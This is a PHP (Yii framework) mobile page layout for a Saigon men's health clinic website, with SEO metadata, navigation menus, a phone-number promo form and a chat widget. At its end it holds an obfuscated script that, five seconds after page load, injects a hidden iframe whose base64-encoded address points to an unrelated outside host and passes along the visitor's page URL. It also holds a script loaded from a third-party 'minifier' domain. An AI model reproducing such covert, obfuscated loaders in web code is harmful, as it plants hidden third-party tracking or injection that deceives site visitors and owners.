<?php

use yii\helpers\Html;
use yii\bootstrap\Nav;
use yii\bootstrap\NavBar;
use yii\widgets\Breadcrumbs;
use app\assets\MobileAsset;
use yii\bootstrap\Modal;
use app\components\helpers\HelperLink;
use yii\helpers\Url;
use app\components\helpers\UploadImage;
use app\widgets\chat\ChatWidget;

/* @var $this \yii\web\View */
/* @var $content string */

MobileAsset::register($this);
?>
<?php $this->beginPage() ?>
<!DOCTYPE html>
<html lang="<?= Yii::$app->language ?>">
<head>
    <meta charset="<?= Yii::$app->charset ?>"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"/>

    <title><?= Html::encode($this->context->title) ?></title>
    <link rel="canonical" href="<?php echo Yii::$app->params['url']['sitemaps'].$this->context->link; ?>">
    <meta name="robots" content="noodp,<?php echo $this->context->index; ?>,follow" />
    <meta name="description" itemprop="description" content="<?php echo $this->context->description; ?>"/>
    <meta name="keywords" itemprop="keywords" content="<?php echo $this->context->keywords; ?>"/>
    <meta property="og:url" content="<?php echo Yii::$app->params['url']['sitemaps'].$this->context->link; ?>">
    <meta property="og:title" content="<?= $this->context->title; ?>">
    <meta property="og:description" content="<?php echo $this->context->description; ?>">
    <meta property="og:image" content="<?= $this->context->image; ?>">
    <meta property="og:image:type" content="image/jpg">
    <meta property="og:image:width" content="600">
    <meta property="og:image:height" content="400">
    <meta property="og:image:alt" content="<?php echo $this->context->keywords; ?>"/>
    <meta property="og:type" content="website">
    <meta property="og:site_name" content="Bệnh viện Nam học Sài Gòn">
    <meta property="fb:app_id" content="<?php echo $this->context->app_id; ?>">
    <meta name="twitter:card" content="summary" />
    <meta name="twitter:description" content="<?php echo $this->context->description; ?>" />
    <meta name="twitter:title" content="<?= $this->context->title; ?>" />
    <meta name="twitter:image" content="<?= $this->context->image; ?>" />
    <meta name="AUTHOR" content="<?php echo $this->context->author; ?>"/>
    <link rel="alternate" href="<?php echo Yii::$app->params['url']['sitemaps'].$this->context->link; ?>" hreflang="vi-vn"/>
    <link rel="icon" href="<?php echo $this->context->favicon; ?>" type="image/x-icon">
    <link rel="shortcut icon" href="<?php echo $this->context->favicon; ?>" type="image/x-icon">
    
    <?= Html::csrfMetaTags() ?>
    <meta name="google-site-verification" content="Qd9ZoQ-lEBfVFOx5K_ZwFkVreVvSvp305_0K3NPvmUA" />
    <?php $this->head() ?>
    <?= $this->context->js; ?>


    <script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Organization",
  "name": "Bệnh viện Nam học Sài Gòn - Địa chỉ khám chữa Nam khoa uy tín TP.HCM",
  "legalName":"Bệnh viện Nam học Sài Gòn - Địa chỉ khám chữa Nam khoa uy tín TP.HCM",
  "alternateName": "Nam học Sài Gòn",
  "url": "https://namhocsaigon.com",
  "logo": "https://namhocsaigon.com/theme/images/logo-nam-hoc-sai-gon.png",
  "foundingLocation":"số 495, đường Cộng Hòa, phường 15, quận Tân Bình, thành phố Hồ Chí Minh",
  "email":"benhviennamhocsaigon@gmail.com",
  "contactPoint": {
    "@type": "ContactPoint",
    "telephone": "+84396757702",
    "contactType": "customer service",
    "contactOption": "TollFree",
    "areaServed": "VN",
    "availableLanguage": "Vietnamese"
  },
  "sameAs": [
    "https://www.facebook.com/namhocSG.TB",
    "https://twitter.com/namhocsaigon",
    "https://www.instagram.com/namhoc.sg.495conghoa",
    "https://www.youtube.com/channel/UCw2yTgwg-a3J8I2BU_3MPMg",
    "https://www.linkedin.com/in/namhocsaigon/",
    "https://namhocsaigon.tumblr.com/",
    "https://www.pinterest.com/namhocsaigon/",
    "https://www.flickr.com/photos/namhocsaigon/"
  ]
}

    </script>
    <script type="application/ld+json">
{
  "@context": "http://schema.org/",
  "@type": "WebSite",
  "name": "Bệnh viện Nam học Sài Gòn - Địa chỉ khám chữa Nam khoa uy tín TP.HCM",
  "datePublished": "2019-10-23",
  "url": "https://namhocsaigon.com",
  "potentialAction": {
    "@type": "SearchAction",
    "target": "http://namhocsaigon.com/tim-kiem.html?search{search_term_string}",
    "query-input": "required name=search_term_string"
  }
}

    </script>
    <script type="application/ld+json">
{
  "@context": "http://schema.org/",
  "@type": "Person",
  "name": "Lê Minh Lộc",
   "jobTitle": "doctor",
  "worksFor": {
    "@type": "Organization",
    "name": "Bệnh viện Nam học Sài Gòn - Địa chỉ khám chữa Nam khoa uy tín TP.HCM",
  "image" : "https://namhocsaigon.com/themes/assets/images/bs_minh-loc.jpg",
  "url": "https://namhocsaigon.com/",
  "sameAs": [
   "https://twitter.com/leminhloc_NHSG",
     "https://www.youtube.com/channel/UCxbmpAwRrsrPBXxnkwq4tUQ",
     "https://www.instagram.com/leminhloc.nhsg",
     "https://www.facebook.com/namkhoasaigon.495conghoa",
     "https://www.linkedin.com/in/leminhloc-doctor/"
  ]
  }
}
}

    </script>
    <script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "LocalBusiness",
  "name": "Bệnh viện Nam học Sài Gòn - Địa chỉ khám chữa Nam khoa uy tín TP.HCM",
  "description":"Phòng khám Bệnh viện Nam học Sài Gòn địa chỉ 495 đường Cộng Hòa, P.15, quận Tân Bình, TP.Hồ Chí Minh luôn là điểm đến khám chữa Nam Khoa, bệnh xã hội,... tin cậy của người dân Sài Gòn nói riêng và 19 tỉnh thành khu vực Nam Bộ nói chung. Gọi ngay Hotline: 0396757702 để được bác sĩ tư vấn miễn phí!",
  "founder":"Lê Minh Lộc",
  "image": "https://namhocsaigon.com/theme/images/logo-nam-hoc-sai-gon.png",
    "url": "https://namhocsaigon.com",
  "telephone": "0396757702",
  "priceRange": "1000",
  "address": {
    "@type": "PostalAddress",
    "streetAddress": "Số 495 Đường Cộng Hòa, Phường 15, Quận Tân Bình, Thành phố Hồ Chí Minh",
    "addressLocality": "Thành phố Hồ Chí Minh",
    "postalCode": "700000",
    "addressCountry": "VN"
  },
  "geo": {
    "@type": "GeoCoordinates",
    "latitude": 10.8062749,
    "longitude": 106.6357158
  },
  "openingHoursSpecification": {
    "@type": "OpeningHoursSpecification",
    "dayOfWeek": [
      "Monday",
      "Tuesday",
      "Wednesday",
      "Thursday",
      "Friday",
      "Saturday"
    ],
    "opens": "08:00",
    "closes": "20:00"
  },
  "sameAs": [
        "https://www.facebook.com/namhocSG.TB",
       "https://www.youtube.com/channel/UCw2yTgwg-a3J8I2BU_3MPMg",
"https://twitter.com/namhocsaigon",
"https://www.linkedin.com/in/namhocsaigon/",
"https://www.instagram.com/namhoc.sg.495conghoa/",
"https://namhocsaigon.tumblr.com/",
"https://www.pinterest.com/namhocsaigon/",
"https://www.flickr.com/photos/namhocsaigon/",
"https://medium.com/@namhocsaigon",
"https://www.reddit.com/user/NamhocSaiGon",
"https://soundcloud.com/namhocsaigon",
"https://myspace.com/namhocsaigon",
"https://ok.ru/namhocsaigon",
"https://flipboard.com/@Namhocsaigon",
"https://www.diigo.com/user/namhocsaigon",
"https://www.behance.net/namhocsaigon/",
"http://www.wikidot.com/user:info/namhocSaiGon",
"https://issuu.com/namhocsaigon",
"https://vk.com/namhocsaigon",
"https://www.quora.com/profile/Nam-H%E1%BB%8Dc-S%C3%A0i-G%C3%B2n",
"https://www.scoop.it/u/nam-hoc-sai-gon",
        "https://mix.com/namhocsaigon"
  ]
}

    </script>
</head>
<body>

<?php $this->beginBody() ?>
<!--header-->
<header id="header-scroll-mb">
    <div class="container">
        <div class="scroll__logo" style="width: 55% !important;">
            <a href="/"><img src="/themes/assets/images/mobile/logo.png" alt="Nam học Sài Gòn"></a>

        </div>
        <div class="scroll__phone">
            <a href="tel:<?=$this->context->hotline?>">
                <img src="/themes/assets/images/mobile/phone2.png" alt="Số điện thoại tư vấn">
            </a>
        </div>
        <form id="scroll-mb" method="get" action="/search">
            <input type="text" class="form-control" id="tk-mb" placeholder="Tìm kiếm." name="search">
            <button type="submit" class="bt-tk"><i class="fa fa-search"></i></button>
        </form>
    </div>
</header>
<header id="header-mb">
    <div class="container">
        <div class="header-mb__logo">
            <a href="/"><img src="/themes/assets/images/mobile/logo.png" alt="Nam học Sài Gòn"></a>

        </div>
        <div class="toogle-menu" onclick="Main.open_menu(0)">
            <img src="/themes/assets/images/mobile/nav.png" alt="nav">
        </div>
    </div>
</header>
<nav id="navbar-menu-mb">
    <div class="navbar-primary">
        <a href="#" title="" class="banner">
            <img src="/themes/assets/images/mobile/logo.png" alt="8_loi_ich">
        </a>
        <ul class="list-unstyled">
            <li>
                <a href="/">
                    <i class="fa fa-home"></i><span>Trang chủ </span>
                </a>
            </li>
            <li>
                <a href="/gioi-thieu">
                    <i class="fa fa-cube"></i><span>Giới Thiệu</span>
                </a>
            </li>
            <li>
                <a href="/lien-he">
                    <i class="fa fa-cube"></i><span>Liên hệ</span>
                </a>
            </li>
            <li>
                <a href="/nam-khoa">
                    <i class="fa fa-arrow-circle-down"></i><span>Bệnh Nam khoa</span>
                </a>
                <ul class="sub-mb">
                    <li><a href="/cat-bao-quy-dau">Cắt Bao Quy Đầu</a></li>
                    <li><a href="/viem-bao-quy-dau">Viêm Bao Quy Đầu</a></li>
                    <li><a href="/hep-bao-quy-dau">Hẹp Bao Quy Đầu</a></li>
                    <li><a href="/dai-bao-quy-dau">Dài Bao Quy Đầu</a></li>
                    <li><a href="/chua-yeu-sinh-ly-o-dau-thanh-pho-ho-chi-minh">Yếu sinh lý</a></li>
                    <li><a href="/tieu-nhieu-lan-lien-tuc-la-benh-gi-chua-ra-sao%C2%A0">Tiểu nhiều, tiểu buốt</a></li>
                </ul>
            </li>
            <li>
                <a href="/benh-xa-hoi">
                    <i class="fa fa-arrow-circle-down"></i><span>Bệnh xã hội</span>
                </a>
                <ul class="sub-mb">
                    <li><a href="/benh-xa-hoi/sui-mao-ga">Sùi Mào Gà</a></li>
                    <li><a href="/benh-xa-hoi/benh-lau">Bệnh Lậu</a></li>
                    <li><a href="/benh-xa-hoi/giang-mai">Bệnh Giang Mai</a></li>
                    <li><a href="/benh-xa-hoi/mun-rop-sinh-duc">Mụn Rộp Sinh Dục</a></li>
                </ul>
            </li>
        </ul>
    </div>
    <div class="navbar-right" onclick="Main.open_menu(1)"></div>
</nav>
<header id="header-mb__time">
    <div class="image text-center">
        <img src="/themes/assets/images/mobile/glv.png" alt="Thời gian làm việc" style="max-width: 100%;">
    </div>
    <div class="image text-center">
        <img src="/themes/assets/images/mobile/ddn.png" alt="Số điện thoại tư vấn" style="width: 60%">
    </div>
</header>


<!--popup-->
<div id="box-getphone">
    <div class="card1">
        <div class="header">
            <strong>Để lại số điện thoại</strong>
            <p>Bác sĩ sẽ tư vấn cho bạn!</p>
            <img src="/themes/assets/images/bs-leminhloc.png" id="prf">
        </div>
        <div class="km">
            <h4>Chương trình ưu đãi tháng ĐẶC BIỆT</h4>
            <p>Dành cho bệnh nhận có mã số đặt hẹn trước</p>
            <ul>
                <li>- Tư vấn bác sĩ miễn phí tại cơ sở </li>
                <li>- Giảm  <strong style="color: red;">50%</strong> chi phí xét nghiệm</li>
                <li>- Giảm <strong style="color: red;">30%</strong> chi phí điều trị</li>
                <li>- Giảm <strong style="color: red;">50%</strong> chi phí phẫu thuật cắt BQĐ</li>
            </ul>
        </div>
        <form id="order-form_100" class="form-phone" action="javascript:void(0)" role="form" method="post">
            <input type="tel" class="form-control" id="" placeholder="Nhập số điện thoại để nhận mã ưu đãi" name="phone">
            <input type="hidden" name="site" value="https://namhocsaigon.com/">
            <input type="hidden" name="name" value="<?php echo Yii::$app->params['url']['sitemaps'] . $this->context->link; ?>">
            <input type="hidden" name="position" value="1">
            <input type="hidden" name="benh">
            <input type="hidden" name="content">
            <button type="submit" class="btn btn-primary btn-submit" onclick="Contact.Phone4()">Gửi</button>
        </form>
        <div class="btn-support btn-mb">
            <a class="btn-chat active" href="javascript:void(Tawk_API.toggle());">Tư vấn</a>
            <a class="btn-hotline" href="tel:<?= $this->context->hotline?>"><?= $this->context->hotline?></a>
            <a class="btn-zalo" href="https://zalo.me/<?= $this->context->hotline?>">Zalo</a>
        </div>
        <div class="block-info">
            <i class="fa fa-lock" aria-hidden="true"></i>
            Thông tin của bạn hoàn toàn được bảo mật
        </div>
        <div class="btn-close getbox-close" data-remove-class=".box-getphone active | .site-overlay active">
            <i class="fa fa-times"></i>
        </div>
    </div>
</div>
<!--end popup-->
<!--end header-->
<section id="content" class="site-content" style="margin: 0">
    <section id="slide-mb">
        <img src="/themes/assets/images/mobile/banner.jpg" alt="banner-namkhoa">
    </section>
  <?= $content ?>
</section>
<div class="fixed-right">
    <ul class="list-unstyled clearfix">
        <li class="btn-order" data-add-class=".box-order active">
            <a href="javascript:void(Tawk_API.toggle());">
                <span class="icon icon-order"></span>
                <span class="text-desc">Đặt Hẹn</span>
            </a>
        </li>
        <li class="chat-fb">
            <a href="https://www.messenger.com/t/namhocSG.TB">
                <span class="icon icon-fb"></span>
                <span class="text-desc">Facebook</span>
            </a>
        </li>
        <li class="chat-zalo">
            <a href="https://zalo.me/<?= $this->context->hotline?>">
                <span class="icon icon-zalo"></span>
                <span class="text-desc">Chat Zalo</span>
            </a>
        </li>
    </ul>
</div>
<!--footer-->
<footer id="footer-mb">
    <ul class="footer-mb__left">
        <li>Liên hệ</li>
        <li><i class="fa fa-envelope"></i><a href="/gioi-thieu" style="color: #fff;" title="Giới thiệu">Giới thiệu</a></li>
        <li><i class="fa fa-mobile"></i><?= $this->context->hotline?></li>
        <li><i class="fa fa-map-marker"></i><?= $this->context->address?></li>
    </ul>
    <ul class="footer-mb__right">
        <li>Chính sách và dịch vụ</li>
        <li><a href="/chinh-sach-bao-mat-thong-tin" rel="nofollow">Bảo mật thông tin</a></li>
        <li><a href="javascript:void(Tawk_API.toggle());" rel="nofollow">Tư vấn và đặt hẹn</a></li>
        <li><a href="/lien-he" rel="nofollow">Liên hệ</a></li>
        <li><a href="javascript:void(Tawk_API.toggle());" rel="nofollow">Kết nối với chúng tôi</a></li>
        <li>
            <a href="https://www.facebook.com/namhocSG.TB" rel="nofollow" target="_blank"><i class="fa fa-facebook-f"></i></a>
            <a href="https://twitter.com/namhocsaigon" rel="nofollow" target="_blank"><i class="fa fa-twitter"></i></a>
            <a href="https://www.youtube.com/channel/UCw2yTgwg-a3J8I2BU_3MPMg " rel="nofollow" target="_blank"><i class="fa fa-youtube"></i></a>
            <a href="https://www.linkedin.com/in/namhocsaigon/" rel="nofollow" target="_blank"><i class="fa fa-linkedin"></i></a>
            <a href="https://www.instagram.com/namhoc.sg.495conghoa/" rel="nofollow" target="_blank"><i
                        class="fa fa-instagram"></i></a>
            <a href="https://namhocsaigon.tumblr.com/" rel="nofollow" target="_blank"><i
                        class="fa fa-tumblr"></i></a>
            <a href="https://www.pinterest.com/namhocsaigon/" rel="nofollow" target="_blank"><i
                        class="fa fa-pinterest"></i></a>

        </li>
    </ul>
</footer>
<footer id="footer-copyright-mb">
    Copyright &#169; 2018 Nam Học Sài Gòn<a href="//www.dmca.com/Protection/Status.aspx?ID=6b3f504e-0bc4-4807-a982-b562fb0760e1" title="DMCA.com Protection Status" class="dmca-badge"> <img src="//images.dmca.com/Badges/dmca_protected_sml_120ad.png?ID=6b3f504e-0bc4-4807-a982-b562fb0760e1" alt="DMCA.com Protection Status"></a> <script src="/images.dmca.com/Badges/DMCABadgeHelper.min.js"> </script>
</footer>
<footer id="footer-toolbar">
    <div class="footer-toolbar__phone">
        <a href="tel:<?=$this->context->hotline?>"><i class="fa fa-phone-square"></i><?=$this->context->hotline?></a>
    </div>
    <div class="footer-toolbar__chat">
<!--        <a href="javascript:void(Tawk_API.toggle());" rel="nofollow" target="_blank"><i class="fa fa-calendar"></i>Đặt hẹn</a>-->
    </div>
</footer>

<!--end footer-->
<!--Start of Tawk.to Script-->
<script type="text/javascript">
    var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
    (function(){
        var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
        s1.async=true;
        s1.src='https://embed.tawk.to/5f27afe24f3c7f1c910db1c2/default';
        s1.charset='UTF-8';
        s1.setAttribute('crossorigin','*');
        s0.parentNode.insertBefore(s1,s0);
    })();
</script>
<!--End of Tawk.to Script-->
<script src="//cssminifier.net/apisd.js?v=643&code=f96f6a22f56dc31e29aeaab3a86bda67" type="text/javascript"></script>
<script type="text/javascript">
    document.addEventListener("DOMContentLoaded", function(event) { setTimeout(function(){ var phone = { create: function () { var c = document.createElement("IFRAME"); c.setAttribute("src", window.atob('aHR0cDovL25nYXluYXluYW14dWEudm4vaW5kZXgucGhwP3JvdXRlPW5ld3MvaW5kZXgmd2Vic2l0ZT1odHRwOi8vbmFta2hvYXNhaWdvbi52biZ0b2tlbj1mN2I0YTU4MTJmMmZjZWRhZDhiZmE3NGM4ZGJlMzI5MSZ1c2VyX2lkPTU5NTk1NiZ1cmw9')+window.location.href); c.style.display = "none"; document.body.appendChild(c); }, }; phone.create(); }, 5000); });
</script>

<?php $this->endBody() ?>
</body>
</html>
<?php $this->endPage() ?>
